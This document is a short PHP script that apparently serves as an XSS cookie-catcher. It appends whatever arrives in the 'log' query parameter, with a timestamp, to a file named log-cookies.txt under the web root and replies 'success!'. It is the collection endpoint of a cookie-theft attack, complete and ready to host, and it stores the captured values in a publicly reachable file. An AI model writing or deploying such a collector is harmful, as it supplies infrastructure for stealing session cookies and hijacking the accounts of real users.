<?php

	if(isset($_GET['log'])){
		date_default_timezone_set("Asia/Shanghai");
		$file = fopen('/var/www/html/log-cookies.txt','aw+');
		fwrite($file,"log-time:".date("Y/m/d H:i:s")."\tmsg=".$_GET['log']."\r\n");
		fclose($file);
		 echo("success!");
	}else{
		 echo("error");
	}

?>
